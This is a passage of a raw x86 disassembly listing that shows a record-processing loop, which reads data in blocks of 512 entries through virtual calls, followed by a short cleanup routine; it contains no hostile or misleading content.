  4050b6:	mov    al,bh
  4050b8:	jmp    0x4050c5
  4050ba:	mov    eax,ds:0x40eaec
  4050bf:	movzx  ecx,dx
  4050c2:	mov    al,BYTE PTR [ecx+eax*1]
  4050c5:	test   al,al
  4050c7:	je     0x4050e5
  4050c9:	mov    ecx,DWORD PTR [ebp-0x5f48]
  4050cf:	mov    eax,DWORD PTR [ecx]
  4050d1:	call   DWORD PTR [eax+0x18]
  4050d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4050d7:	pop    edi
  4050d8:	pop    esi
  4050d9:	xor    ecx,ebp
  4050db:	pop    ebx
  4050dc:	call   0x40d492
  4050e1:	mov    esp,ebp
  4050e3:	pop    ebp
  4050e4:	ret    
  4050e5:	test   bl,bl
  4050e7:	setne  al
  4050ea:	mov    BYTE PTR [esi+0xf],al
  4050ed:	movzx  eax,WORD PTR [ebp-0x5f38]
  4050f4:	push   eax
  4050f5:	push   ecx
  4050f6:	push   DWORD PTR [ebp-0x5f48]
  4050fc:	lea    ecx,[ebp-0x5690]
  405102:	mov    WORD PTR [esi+0x1c],dx
  405106:	call   0x406430
  40510b:	movzx  esi,WORD PTR [ebp-0x5f38]
  405112:	movzx  eax,WORD PTR [ebp-0x5f36]
  405119:	imul   esi,esi,0x13
  40511c:	push   eax
  40511d:	add    esi,0x99
  405123:	push   esi
  405124:	push   DWORD PTR [ebp-0x5f48]
  40512a:	lea    ecx,[ebp-0x5ea0]
  405130:	call   0x406510
  405135:	movzx  eax,WORD PTR [ebp-0x5f36]
  40513c:	lea    ecx,[ebp-0x1c60]
  405142:	lea    esi,[esi+eax*4]
  405145:	movzx  eax,WORD PTR [ebp-0x5f34]
  40514c:	push   eax
  40514d:	push   esi
  40514e:	push   DWORD PTR [ebp-0x5f48]
  405154:	call   0x406510
  405159:	movzx  eax,WORD PTR [ebp-0x5f34]
  405160:	lea    ecx,[ebp-0x1450]
  405166:	lea    esi,[esi+eax*4]
  405169:	movzx  eax,WORD PTR [ebp-0x5f32]
  405170:	push   eax
  405171:	push   esi
  405172:	push   DWORD PTR [ebp-0x5f48]
  405178:	call   0x406510
  40517d:	movzx  eax,WORD PTR [ebp-0x5f32]
  405184:	push   eax
  405185:	lea    esi,[esi+eax*4]
  405188:	push   esi
  405189:	push   DWORD PTR [ebp-0x5f48]
  40518f:	lea    ecx,[ebp-0xc40]
  405195:	call   0x406510
  40519a:	movzx  eax,WORD PTR [ebp-0x5f32]
  4051a1:	lea    ecx,[ebp-0x2670]
  4051a7:	lea    esi,[esi+eax*4]
  4051aa:	movzx  eax,WORD PTR [ebp-0x5f30]
  4051b1:	push   eax
  4051b2:	push   esi
  4051b3:	push   DWORD PTR [ebp-0x5f48]
  4051b9:	call   0x4065f0
  4051be:	movzx  ecx,WORD PTR [ebp-0x5f30]
  4051c5:	push   ecx
  4051c6:	lea    eax,[esi+ecx*4]
  4051c9:	add    eax,ecx
  4051cb:	push   eax
  4051cc:	push   DWORD PTR [ebp-0x5f48]
  4051d2:	lea    ecx,[ebp-0x3080]
  4051d8:	call   0x4065f0
  4051dd:	movzx  ecx,WORD PTR [ebp-0x5f38]
  4051e4:	mov    eax,DWORD PTR [ebp-0x5f50]
  4051ea:	mov    edi,DWORD PTR ds:0x40e420
  4051f0:	shl    ecx,0x2
  4051f3:	mov    ds:0x40e420,eax
  4051f8:	call   0x40c940
  4051fd:	mov    cx,WORD PTR [ebp-0x5f38]
  405204:	mov    ebx,eax
  405206:	xor    eax,eax
  405208:	xor    esi,esi
  40520a:	mov    DWORD PTR [ebp-0x5f4c],ebx
  405210:	cmp    ax,cx
  405213:	jae    0x405261
  405215:	jmp    0x405220
  405217:	lea    esp,[esp+0x0]
  40521e:	mov    edi,edi
  405220:	push   esi
  405221:	lea    ecx,[ebp-0x5690]
  405227:	call   0x406490
  40522c:	mov    ecx,DWORD PTR [eax]
  40522e:	sub    esp,0x8
  405231:	mov    edx,esp
  405233:	mov    DWORD PTR [edx],ecx
  405235:	movzx  ecx,WORD PTR [eax+0x4]
  405239:	mov    al,BYTE PTR [eax+0x6]
  40523c:	mov    WORD PTR [edx+0x4],cx
  405240:	mov    BYTE PTR [edx+0x6],al
  405243:	call   0x4067e0
  405248:	mov    ecx,eax
  40524a:	call   0x403430
  40524f:	mov    DWORD PTR [ebx+esi*4],eax
  405252:	mov    cx,WORD PTR [ebp-0x5f38]
  405259:	movzx  eax,cx
  40525c:	inc    esi
  40525d:	cmp    esi,eax
  40525f:	jb     0x405220
  405261:	mov    DWORD PTR ds:0x40e420,edi
  405267:	xor    edi,edi
  405269:	xor    edx,edx
  40526b:	xor    eax,eax
  40526d:	mov    DWORD PTR [ebp-0x5f58],edi
  405273:	mov    DWORD PTR [ebp-0x5f68],edi
  405279:	mov    DWORD PTR [ebp-0x5f64],edi
  40527f:	mov    DWORD PTR [ebp-0x5f6c],edi
  405285:	mov    DWORD PTR [ebp-0x5f60],edi
  40528b:	mov    DWORD PTR [ebp-0x5f5c],edi
  405291:	mov    DWORD PTR [ebp-0x5f70],edx
  405297:	cmp    ax,cx
  40529a:	jae    0x4059d1
  4052a0:	cmp    BYTE PTR ds:0x40e42a,0x0
  4052a7:	jne    0x4059f5
  4052ad:	push   edx
  4052ae:	lea    ecx,[ebp-0x5690]
  4052b4:	call   0x406490
  4052b9:	mov    esi,eax
  4052bb:	mov    eax,DWORD PTR [ebp-0x5f70]
  4052c1:	movzx  ecx,WORD PTR [esi+0x7]
  4052c5:	mov    ebx,DWORD PTR [ebx+eax*4]
  4052c8:	mov    DWORD PTR [ebp-0x5f54],esi
  4052ce:	cmp    edi,ecx
  4052d0:	jae    0x405349
  4052d2:	push   edi
  4052d3:	lea    ecx,[ebp-0x5ea0]
  4052d9:	call   0x406570
  4052de:	cmp    BYTE PTR [ebp-0x5f41],0x0
  4052e5:	mov    edx,eax
  4052e7:	jne    0x40530d
  4052e9:	movzx  eax,WORD PTR [edx+0x2]
  4052ed:	mov    ecx,0xffff
  4052f2:	cmp    ax,cx
  4052f5:	jne    0x4052ff
  4052f7:	mov    al,BYTE PTR [ebp-0x5f42]
  4052fd:	jmp    0x405309
  4052ff:	mov    ecx,eax
  405301:	mov    eax,ds:0x40eaec
  405306:	mov    al,BYTE PTR [ecx+eax*1]
  405309:	test   al,al
  40530b:	jne    0x40533a
  40530d:	movzx  eax,WORD PTR [edx]
  405310:	mov    WORD PTR [ebp-0x5f74],ax
  405317:	movzx  eax,WORD PTR [edx+0x2]
  40531b:	mov    WORD PTR [ebp-0x5f72],ax
  405322:	push   DWORD PTR [ebp-0x5f74]
  405328:	lea    ecx,[ebx+0xa]
  40532b:	call   0x405d10
  405330:	mov    eax,DWORD PTR [ebp-0x5f50]
  405336:	inc    WORD PTR [eax+0x6]
  40533a:	movzx  eax,WORD PTR [esi+0x7]
  40533e:	inc    edi
  40533f:	cmp    edi,eax
  405341:	jb     0x4052d2
  405343:	mov    DWORD PTR [ebp-0x5f58],edi
  405349:	movzx  eax,WORD PTR [esi+0x9]
  40534d:	mov    ecx,DWORD PTR [ebp-0x5f68]
  405353:	cmp    ecx,eax
  405355:	jae    0x40545d
  40535b:	jmp    0x405360
  40535d:	lea    ecx,[ecx+0x0]
  405360:	mov    edi,ecx
  405362:	and    edi,0x800001ff
  405368:	jns    0x405372
  40536a:	dec    edi
  40536b:	or     edi,0xfffffe00
  405371:	inc    edi
  405372:	mov    eax,DWORD PTR [ebp-0x1c5c]
  405378:	cmp    ecx,eax
  40537a:	jl     0x405385
  40537c:	add    eax,0x200
  405381:	cmp    ecx,eax
  405383:	jl     0x4053dd
  405385:	mov    eax,DWORD PTR [ebp-0x1c58]
  40538b:	mov    esi,ecx
  40538d:	sub    esi,edi
  40538f:	sub    eax,esi
  405391:	mov    DWORD PTR [ebp-0x1c5c],esi
  405397:	cmp    eax,0x200
  40539c:	jle    0x4053a3
  40539e:	mov    eax,0x200
  4053a3:	mov    ecx,DWORD PTR [ebp-0x1c60]
  4053a9:	shl    eax,0x2
  4053ac:	mov    DWORD PTR [ebp-0x5fa0],eax
  4053b2:	mov    edx,DWORD PTR [ecx]
  4053b4:	lea    eax,[ebp-0x5fa0]
  4053ba:	push   eax
  4053bb:	lea    eax,[ebp-0x1c54]
  4053c1:	push   eax
  4053c2:	mov    eax,DWORD PTR [ebp-0x1454]
  4053c8:	lea    eax,[eax+esi*4]
  4053cb:	push   eax
  4053cc:	call   DWORD PTR [edx+0x4]
  4053cf:	test   eax,eax
  4053d1:	je     0x405a0b
  4053d7:	mov    esi,DWORD PTR [ebp-0x5f54]
  4053dd:	cmp    BYTE PTR [ebp-0x5f41],0x0
  4053e4:	jne    0x40540e
  4053e6:	movzx  eax,WORD PTR [ebp+edi*4-0x1c52]
  4053ee:	mov    ecx,0xffff
  4053f3:	cmp    ax,cx
  4053f6:	jne    0x405400
  4053f8:	mov    al,BYTE PTR [ebp-0x5f42]
  4053fe:	jmp    0x40540a
  405400:	mov    ecx,eax
  405402:	mov    eax,ds:0x40eaec
  405407:	mov    al,BYTE PTR [ecx+eax*1]
  40540a:	test   al,al
  40540c:	jne    0x405444
  40540e:	movzx  eax,WORD PTR [ebp+edi*4-0x1c54]
  405416:	mov    WORD PTR [ebp-0x5f78],ax
  40541d:	movzx  eax,WORD PTR [ebp+edi*4-0x1c52]
  405425:	mov    WORD PTR [ebp-0x5f76],ax
  40542c:	push   DWORD PTR [ebp-0x5f78]
  405432:	lea    ecx,[ebx+0xe]
  405435:	call   0x405e00
  40543a:	mov    eax,DWORD PTR [ebp-0x5f50]
  405440:	inc    WORD PTR [eax+0x4]
  405444:	mov    ecx,DWORD PTR [ebp-0x5f68]
  40544a:	movzx  eax,WORD PTR [esi+0x9]
  40544e:	inc    ecx
  40544f:	mov    DWORD PTR [ebp-0x5f68],ecx
  405455:	cmp    ecx,eax
  405457:	jb     0x405360
  40545d:	movzx  eax,WORD PTR [esi+0xb]
  405461:	mov    ecx,DWORD PTR [ebp-0x5f64]
  405467:	cmp    ecx,eax
  405469:	jae    0x40556d
  40546f:	nop
  405470:	mov    edi,ecx
  405472:	and    edi,0x800001ff
  405478:	jns    0x405482
  40547a:	dec    edi
  40547b:	or     edi,0xfffffe00
  405481:	inc    edi
  405482:	mov    eax,DWORD PTR [ebp-0x144c]
  405488:	cmp    ecx,eax
  40548a:	jl     0x405495
  40548c:	add    eax,0x200
  405491:	cmp    ecx,eax
  405493:	jl     0x4054ed
  405495:	mov    eax,DWORD PTR [ebp-0x1448]
  40549b:	mov    esi,ecx
  40549d:	sub    esi,edi
  40549f:	sub    eax,esi
  4054a1:	mov    DWORD PTR [ebp-0x144c],esi
  4054a7:	cmp    eax,0x200
  4054ac:	jle    0x4054b3
  4054ae:	mov    eax,0x200
  4054b3:	mov    ecx,DWORD PTR [ebp-0x1450]
  4054b9:	shl    eax,0x2
  4054bc:	mov    DWORD PTR [ebp-0x5f94],eax
  4054c2:	mov    edx,DWORD PTR [ecx]
  4054c4:	lea    eax,[ebp-0x5f94]
  4054ca:	push   eax
  4054cb:	lea    eax,[ebp-0x1444]
  4054d1:	push   eax
  4054d2:	mov    eax,DWORD PTR [ebp-0xc44]
  4054d8:	lea    eax,[eax+esi*4]
  4054db:	push   eax
  4054dc:	call   DWORD PTR [edx+0x4]
  4054df:	test   eax,eax
  4054e1:	je     0x405a0b
  4054e7:	mov    esi,DWORD PTR [ebp-0x5f54]
  4054ed:	cmp    BYTE PTR [ebp-0x5f41],0x0
  4054f4:	jne    0x40551e
  4054f6:	movzx  eax,WORD PTR [ebp+edi*4-0x1442]
  4054fe:	mov    ecx,0xffff
  405503:	cmp    ax,cx
  405506:	jne    0x405510
  405508:	mov    al,BYTE PTR [ebp-0x5f42]
  40550e:	jmp    0x40551a
  405510:	mov    ecx,eax
  405512:	mov    eax,ds:0x40eaec
  405517:	mov    al,BYTE PTR [ecx+eax*1]
  40551a:	test   al,al
  40551c:	jne    0x405554
  40551e:	movzx  eax,WORD PTR [ebp+edi*4-0x1444]
  405526:	mov    ecx,DWORD PTR [ebp-0x5f4c]
  40552c:	mov    dx,WORD PTR [ebp+edi*4-0x1442]
  405534:	mov    ecx,DWORD PTR [ecx+eax*4]
  405537:	sub    esp,0x8
  40553a:	mov    eax,esp
  40553c:	mov    DWORD PTR [eax],ecx
  40553e:	lea    ecx,[ebx+0x12]
  405541:	mov    WORD PTR [eax+0x4],dx
  405545:	call   0x405ef0
  40554a:	mov    eax,DWORD PTR [ebp-0x5f50]
  405550:	inc    WORD PTR [eax+0x8]
  405554:	mov    ecx,DWORD PTR [ebp-0x5f64]
  40555a:	movzx  eax,WORD PTR [esi+0xb]
  40555e:	inc    ecx
  40555f:	mov    DWORD PTR [ebp-0x5f64],ecx
  405565:	cmp    ecx,eax
  405567:	jb     0x405470
  40556d:	movzx  eax,WORD PTR [esi+0xd]
  405571:	mov    ecx,DWORD PTR [ebp-0x5f6c]
  405577:	cmp    ecx,eax
  405579:	jae    0x405673
  40557f:	nop
  405580:	mov    edi,ecx
  405582:	and    edi,0x800001ff
  405588:	jns    0x405592
  40558a:	dec    edi
  40558b:	or     edi,0xfffffe00
  405591:	inc    edi
  405592:	mov    eax,DWORD PTR [ebp-0xc3c]
  405598:	cmp    ecx,eax
  40559a:	jl     0x4055a5
  40559c:	add    eax,0x200
  4055a1:	cmp    ecx,eax
  4055a3:	jl     0x4055fd
  4055a5:	mov    eax,DWORD PTR [ebp-0xc38]
  4055ab:	mov    esi,ecx
  4055ad:	sub    esi,edi
  4055af:	sub    eax,esi
  4055b1:	mov    DWORD PTR [ebp-0xc3c],esi
  4055b7:	cmp    eax,0x200
  4055bc:	jle    0x4055c3
  4055be:	mov    eax,0x200
  4055c3:	mov    ecx,DWORD PTR [ebp-0xc40]
  4055c9:	shl    eax,0x2
  4055cc:	mov    DWORD PTR [ebp-0x5f9c],eax
  4055d2:	mov    edx,DWORD PTR [ecx]
  4055d4:	lea    eax,[ebp-0x5f9c]
  4055da:	push   eax
  4055db:	lea    eax,[ebp-0xc34]
  4055e1:	push   eax
  4055e2:	mov    eax,DWORD PTR [ebp-0x434]
  4055e8:	lea    eax,[eax+esi*4]
  4055eb:	push   eax
  4055ec:	call   DWORD PTR [edx+0x4]
  4055ef:	test   eax,eax
  4055f1:	je     0x405a0b
  4055f7:	mov    esi,DWORD PTR [ebp-0x5f54]
  4055fd:	cmp    BYTE PTR [ebp-0x5f41],0x0
  405604:	jne    0x40562e
  405606:	movzx  eax,WORD PTR [ebp+edi*4-0xc32]
  40560e:	mov    ecx,0xffff
  405613:	cmp    ax,cx
  405616:	jne    0x405620
  405618:	mov    al,BYTE PTR [ebp-0x5f42]
  40561e:	jmp    0x40562a
  405620:	mov    ecx,eax
  405622:	mov    eax,ds:0x40eaec
  405627:	mov    al,BYTE PTR [ecx+eax*1]
  40562a:	test   al,al
  40562c:	jne    0x40565a
  40562e:	movzx  eax,WORD PTR [ebp+edi*4-0xc34]
  405636:	mov    ecx,DWORD PTR [ebp-0x5f4c]
  40563c:	mov    dx,WORD PTR [ebp+edi*4-0xc32]
  405644:	mov    ecx,DWORD PTR [ecx+eax*4]
  405647:	sub    esp,0x8
  40564a:	mov    eax,esp
  40564c:	mov    DWORD PTR [eax],ecx
  40564e:	lea    ecx,[ebx+0x16]
  405651:	mov    WORD PTR [eax+0x4],dx
  405655:	call   0x405ef0
  40565a:	mov    ecx,DWORD PTR [ebp-0x5f6c]
  405660:	movzx  eax,WORD PTR [esi+0xd]
  405664:	inc    ecx
  405665:	mov    DWORD PTR [ebp-0x5f6c],ecx
  40566b:	cmp    ecx,eax
  40566d:	jb     0x405580
  405673:	movzx  eax,WORD PTR [esi+0xf]
  405677:	mov    ecx,DWORD PTR [ebp-0x5f60]
  40567d:	cmp    ecx,eax
  40567f:	jae    0x405811
  405685:	mov    edi,ecx
  405687:	and    edi,0x800001ff
  40568d:	jns    0x405697
  40568f:	dec    edi
  405690:	or     edi,0xfffffe00
  405696:	inc    edi
  405697:	mov    eax,DWORD PTR [ebp-0x266c]
  40569d:	cmp    ecx,eax
  40569f:	jl     0x4056aa
  4056a1:	add    eax,0x200
  4056a6:	cmp    ecx,eax
  4056a8:	jl     0x405704
  4056aa:	mov    eax,DWORD PTR [ebp-0x2668]
  4056b0:	mov    esi,ecx
  4056b2:	sub    esi,edi
  4056b4:	sub    eax,esi
  4056b6:	mov    DWORD PTR [ebp-0x266c],esi
  4056bc:	cmp    eax,0x200
  4056c1:	jle    0x4056c8
  4056c3:	mov    eax,0x200
  4056c8:	mov    ecx,DWORD PTR [ebp-0x2670]
  4056ce:	lea    eax,[eax+eax*4]
  4056d1:	mov    DWORD PTR [ebp-0x5f90],eax
  4056d7:	mov    edx,DWORD PTR [ecx]
  4056d9:	lea    eax,[ebp-0x5f90]
  4056df:	push   eax
  4056e0:	lea    eax,[ebp-0x2664]
  4056e6:	push   eax
  4056e7:	mov    eax,DWORD PTR [ebp-0x1c64]
  4056ed:	lea    eax,[eax+esi*4]
  4056f0:	add    eax,esi
  4056f2:	push   eax
  4056f3:	call   DWORD PTR [edx+0x4]
  4056f6:	test   eax,eax
  4056f8:	je     0x405a0b
  4056fe:	mov    esi,DWORD PTR [ebp-0x5f54]
  405704:	lea    eax,[ebp-0x2664]
  40570a:	add    eax,edi
  40570c:	cmp    BYTE PTR [ebp-0x5f41],0x0
  405713:	lea    edx,[eax+edi*4]
  405716:	jne    0x405740
  405718:	movzx  eax,WORD PTR [edx+0x3]
  40571c:	mov    ecx,0xffff
  405721:	cmp    ax,cx
  405724:	jne    0x40572e
  405726:	mov    al,BYTE PTR [ebp-0x5f42]
  40572c:	jmp    0x405738
  40572e:	mov    ecx,eax
  405730:	mov    eax,ds:0x40eaec
  405735:	mov    al,BYTE PTR [ecx+eax*1]
  405738:	test   al,al
  40573a:	jne    0x4057f8
  405740:	cmp    DWORD PTR [ebx+0x6],0x0
  405744:	movzx  eax,WORD PTR [edx]
  405747:	mov    ecx,DWORD PTR [ebp-0x5f4c]
  40574d:	mov    edi,DWORD PTR [ecx+eax*4]
  405750:	mov    ax,WORD PTR [edx+0x3]
  405754:	mov    WORD PTR [ebp-0x5f83],ax
  40575b:	mov    al,BYTE PTR [edx+0x2]
  40575e:	mov    BYTE PTR [ebp-0x5f84],al
  405764:	jne    0x4057cb
  405766:	mov    ecx,DWORD PTR ds:0x420398
  40576c:	test   ecx,ecx
  40576e:	je     0x405780
  405770:	mov    eax,DWORD PTR [ecx]
  405772:	mov    ds:0x420398,eax
  405777:	xor    eax,eax
  405779:	mov    DWORD PTR [ecx],eax
  40577b:	mov    DWORD PTR [ecx+0x4],eax
  40577e:	jmp    0x4057c8
  405780:	mov    eax,ds:0x422bb0
  405785:	cmp    eax,0x8
  405788:	jge    0x4057af
  40578a:	cmp    eax,0x4
  40578d:	jb     0x40579c
  40578f:	mov    ecx,DWORD PTR ds:0x422bac
  405795:	mov    edx,eax
  405797:	call   0x40ca10
  40579c:	mov    ecx,0x200
  4057a1:	call   0x40c940
  4057a6:	mov    edx,eax
  4057a8:	mov    eax,0x200
  4057ad:	jmp    0x4057b5
  4057af:	mov    edx,DWORD PTR ds:0x422bac
  4057b5:	sub    eax,0x8
  4057b8:	mov    ecx,edx
  4057ba:	add    edx,0x8
  4057bd:	mov    ds:0x422bb0,eax
  4057c2:	mov    DWORD PTR ds:0x422bac,edx
  4057c8:	mov    DWORD PTR [ebx+0x6],ecx
  4057cb:	mov    ax,WORD PTR [ebp-0x5f84]
  4057d2:	sub    esp,0x8
  4057d5:	mov    ecx,esp
  4057d7:	mov    DWORD PTR [ecx],edi
  4057d9:	mov    WORD PTR [ecx+0x4],ax
  4057dd:	mov    al,BYTE PTR [ebp-0x5f82]
  4057e3:	mov    BYTE PTR [ecx+0x6],al
  4057e6:	mov    ecx,DWORD PTR [ebx+0x6]
  4057e9:	call   0x405bf0
  4057ee:	mov    eax,DWORD PTR [ebp-0x5f50]
  4057f4:	inc    WORD PTR [eax+0xa]
  4057f8:	mov    ecx,DWORD PTR [ebp-0x5f60]
  4057fe:	movzx  eax,WORD PTR [esi+0xf]
  405802:	inc    ecx
  405803:	mov    DWORD PTR [ebp-0x5f60],ecx
  405809:	cmp    ecx,eax
  40580b:	jb     0x405685
  405811:	movzx  eax,WORD PTR [esi+0x11]
  405815:	mov    edx,DWORD PTR [ebp-0x5f5c]
  40581b:	cmp    edx,eax
  40581d:	jae    0x4059a8
  405823:	mov    edi,edx
  405825:	and    edi,0x800001ff
  40582b:	jns    0x405835
  40582d:	dec    edi
  40582e:	or     edi,0xfffffe00
  405834:	inc    edi
  405835:	mov    eax,DWORD PTR [ebp-0x307c]
  40583b:	cmp    edx,eax
  40583d:	jl     0x405848
  40583f:	add    eax,0x200
  405844:	cmp    edx,eax
  405846:	jl     0x4058a2
  405848:	mov    eax,DWORD PTR [ebp-0x3078]
  40584e:	mov    esi,edx
  405850:	sub    esi,edi
  405852:	sub    eax,esi
  405854:	mov    DWORD PTR [ebp-0x307c],esi
  40585a:	cmp    eax,0x200
  40585f:	jle    0x405866
  405861:	mov    eax,0x200
  405866:	mov    ecx,DWORD PTR [ebp-0x3080]
  40586c:	lea    eax,[eax+eax*4]
  40586f:	mov    DWORD PTR [ebp-0x5f98],eax
  405875:	mov    edx,DWORD PTR [ecx]
  405877:	lea    eax,[ebp-0x5f98]
  40587d:	push   eax
  40587e:	lea    eax,[ebp-0x3074]
  405884:	push   eax
  405885:	mov    eax,DWORD PTR [ebp-0x2674]
  40588b:	lea    eax,[eax+esi*4]
  40588e:	add    eax,esi
  405890:	push   eax
  405891:	call   DWORD PTR [edx+0x4]
  405894:	test   eax,eax
  405896:	je     0x405a0b
  40589c:	mov    esi,DWORD PTR [ebp-0x5f54]
  4058a2:	lea    eax,[ebp-0x3074]
  4058a8:	add    eax,edi
  4058aa:	cmp    BYTE PTR [ebp-0x5f41],0x0
  4058b1:	lea    edx,[eax+edi*4]
  4058b4:	jne    0x4058de
  4058b6:	movzx  eax,WORD PTR [edx+0x3]
  4058ba:	mov    ecx,0xffff
  4058bf:	cmp    ax,cx
  4058c2:	jne    0x4058cc
  4058c4:	mov    al,BYTE PTR [ebp-0x5f42]
  4058ca:	jmp    0x4058d6
  4058cc:	mov    ecx,eax
  4058ce:	mov    eax,ds:0x40eaec
  4058d3:	mov    al,BYTE PTR [ecx+eax*1]
  4058d6:	test   al,al
  4058d8:	jne    0x40598f
  4058de:	cmp    DWORD PTR [ebx+0x6],0x0
  4058e2:	movzx  eax,WORD PTR [edx]
  4058e5:	mov    ecx,DWORD PTR [ebp-0x5f4c]
  4058eb:	mov    edi,DWORD PTR [ecx+eax*4]
  4058ee:	mov    ax,WORD PTR [edx+0x3]
  4058f2:	mov    WORD PTR [ebp-0x5f7b],ax
  4058f9:	mov    al,BYTE PTR [edx+0x2]
  4058fc:	mov    BYTE PTR [ebp-0x5f7c],al
  405902:	jne    0x405969
  405904:	mov    ecx,DWORD PTR ds:0x420398
  40590a:	test   ecx,ecx
  40590c:	je     0x40591e
  40590e:	mov    eax,DWORD PTR [ecx]
  405910:	mov    ds:0x420398,eax
  405915:	xor    eax,eax
  405917:	mov    DWORD PTR [ecx],eax
  405919:	mov    DWORD PTR [ecx+0x4],eax
  40591c:	jmp    0x405966
  40591e:	mov    eax,ds:0x422bb0
  405923:	cmp    eax,0x8
  405926:	jge    0x40594d
  405928:	cmp    eax,0x4
  40592b:	jb     0x40593a
  40592d:	mov    ecx,DWORD PTR ds:0x422bac
  405933:	mov    edx,eax
  405935:	call   0x40ca10
  40593a:	mov    ecx,0x200
  40593f:	call   0x40c940
  405944:	mov    edx,eax
  405946:	mov    eax,0x200
  40594b:	jmp    0x405953
  40594d:	mov    edx,DWORD PTR ds:0x422bac
  405953:	sub    eax,0x8
  405956:	mov    ecx,edx
  405958:	add    edx,0x8
  40595b:	mov    ds:0x422bb0,eax
  405960:	mov    DWORD PTR ds:0x422bac,edx
  405966:	mov    DWORD PTR [ebx+0x6],ecx
  405969:	mov    ax,WORD PTR [ebp-0x5f7c]
  405970:	sub    esp,0x8
  405973:	mov    ecx,esp
  405975:	mov    DWORD PTR [ecx],edi
  405977:	mov    WORD PTR [ecx+0x4],ax
  40597b:	mov    al,BYTE PTR [ebp-0x5f7a]
  405981:	mov    BYTE PTR [ecx+0x6],al
  405984:	mov    ecx,DWORD PTR [ebx+0x6]
  405987:	add    ecx,0x4
  40598a:	call   0x405bf0
  40598f:	mov    edx,DWORD PTR [ebp-0x5f5c]
  405995:	movzx  eax,WORD PTR [esi+0x11]
  405999:	inc    edx
  40599a:	mov    DWORD PTR [ebp-0x5f5c],edx
  4059a0:	cmp    edx,eax
  4059a2:	jb     0x405823
  4059a8:	mov    edx,DWORD PTR [ebp-0x5f70]
  4059ae:	movzx  eax,WORD PTR [ebp-0x5f38]
  4059b5:	mov    ebx,DWORD PTR [ebp-0x5f4c]
  4059bb:	inc    edx
  4059bc:	mov    DWORD PTR [ebp-0x5f70],edx
  4059c2:	cmp    edx,eax
  4059c4:	jae    0x4059d1
  4059c6:	mov    edi,DWORD PTR [ebp-0x5f58]
  4059cc:	jmp    0x4052a0
  4059d1:	push   ebx
  4059d2:	call   DWORD PTR ds:0x42441c
  4059d8:	mov    ecx,DWORD PTR [ebp-0x5f48]
  4059de:	add    esp,0x4
  4059e1:	mov    eax,DWORD PTR [ecx]
  4059e3:	call   DWORD PTR [eax+0x18]
  4059e6:	cmp    BYTE PTR ds:0x40e42a,0x0
  4059ed:	je     0x4050d4
  4059f3:	jmp    0x405a10
  4059f5:	call   0x407400
  4059fa:	push   0x0
  4059fc:	mov    edx,0x4010c0
  405a01:	mov    ecx,0x5e5
  405a06:	call   0x407010
  405a0b:	call   0x402190
  405a10:	call   0x407400
  405a15:	mov    edx,DWORD PTR ds:0x40e644
  405a1b:	push   0x0
  405a1d:	mov    ecx,0x5eb
  405a22:	call   0x407010
  405a27:	int3   
  405a28:	int3   
  405a29:	int3   
  405a2a:	int3   
  405a2b:	int3   
  405a2c:	int3   
  405a2d:	int3   
  405a2e:	int3   
  405a2f:	int3   
  405a30:	push   ebp
  405a31:	mov    ebp,esp
  405a33:	sub    esp,0x808
  405a39:	mov    eax,ds:0x40e018
  405a3e:	xor    eax,ebp
  405a40:	mov    DWORD PTR [ebp-0x4],eax
  405a43:	push   0x40e42c
  405a48:	push   0x400
  405a4d:	lea    eax,[ebp-0x804]
  405a53:	push   eax
  405a54:	lea    eax,[ebp-0x808]
  405a5a:	push   eax
  405a5b:	push   0x401138
  405a60:	push   DWORD PTR ds:0x40e644
  405a66:	call   DWORD PTR ds:0x4244d0
  405a6c:	add    esp,0x18
  405a6f:	test   eax,eax
  405a71:	jne    0x405a8c
  405a73:	mov    eax,DWORD PTR [ebp-0x808]
  405a79:	cmp    eax,0xd
  405a7c:	ja     0x405ae9
  405a7e:	movzx  eax,BYTE PTR [eax+0x405b28]
  405a85:	jmp    DWORD PTR [eax*4+0x405b18]
  405a8c:	cmp    BYTE PTR ds:0x40e42a,0x0
  405a93:	jne    0x405afb
  405a95:	push   0x40e430
  405a9a:	push   0x1
  405a9c:	push   DWORD PTR ds:0x40e42c
  405aa2:	call   DWORD PTR ds:0x4244d4
  405aa8:	add    esp,0xc
  405aab:	test   eax,eax
  405aad:	je     0x405b00
  405aaf:	cmp    BYTE PTR ds:0x40e42a,0x0
  405ab6:	jne    0x405b12
  405ab8:	mov    ecx,DWORD PTR [ebp-0x4]
  405abb:	xor    ecx,ebp
  405abd:	call   0x40d492
  405ac2:	mov    esp,ebp
  405ac4:	pop    ebp
  405ac5:	ret    
  405ac6:	push   0x0
  405ac8:	mov    edx,0x4010c0
  405acd:	mov    ecx,0x5e5
  405ad2:	call   0x407010
  405ad7:	mov    edx,DWORD PTR ds:0x40e644
  405add:	push   0x0
  405adf:	mov    ecx,0x5eb
  405ae4:	call   0x407010
  405ae9:	mov    edx,DWORD PTR ds:0x40e644
  405aef:	push   0x0
  405af1:	mov    ecx,0x5e2
  405af6:	call   0x407010
  405afb:	call   0x407400
  405b00:	mov    edx,DWORD PTR ds:0x40e644
  405b06:	push   0x0
  405b08:	mov    ecx,0x5e1
  405b0d:	call   0x407010
  405b12:	call   0x407400
  405b17:	nop
  405b18:	jmp    0xc6409b77
  405b1d:	pop    edx
  405b1e:	inc    eax
  405b1f:	add    bh,dl
  405b21:	pop    edx
  405b22:	inc    eax
  405b23:	add    cl,ch
  405b25:	pop    edx
  405b26:	inc    eax
  405b27:	add    BYTE PTR [eax],al
  405b29:	add    BYTE PTR [ecx],al
  405b2b:	add    eax,DWORD PTR [ebx]
  405b2d:	add    al,BYTE PTR [edx]
  405b2f:	add    BYTE PTR [eax],al
  405b31:	add    BYTE PTR [edx],al
  405b33:	add    al,BYTE PTR [ebx]
  405b35:	add    cl,ah
  405b37:	int3   
  405b38:	int3   
  405b39:	int3   
  405b3a:	int3   
  405b3b:	int3   
  405b3c:	int3   
  405b3d:	int3   
  405b3e:	int3   
  405b3f:	int3   
  405b40:	mov    ecx,DWORD PTR ds:0x40e430
  405b46:	mov    eax,DWORD PTR [ecx]
  405b48:	call   DWORD PTR [eax]
  405b4a:	mov    ecx,DWORD PTR ds:0x40e42c
  405b50:	mov    eax,DWORD PTR [ecx]
  405b52:	call   DWORD PTR [eax+0x28]
  405b55:	mov    ecx,DWORD PTR ds:0x40e42c
  405b5b:	mov    eax,DWORD PTR [ecx]
  405b5d:	call   DWORD PTR [eax+0x2c]
  405b60:	mov    DWORD PTR ds:0x40e430,0x0
  405b6a:	mov    DWORD PTR ds:0x40e42c,0x0
  405b74:	ret    
  405b75:	int3   
  405b76:	int3   
  405b77:	int3   
  405b78:	int3   
  405b79:	int3   
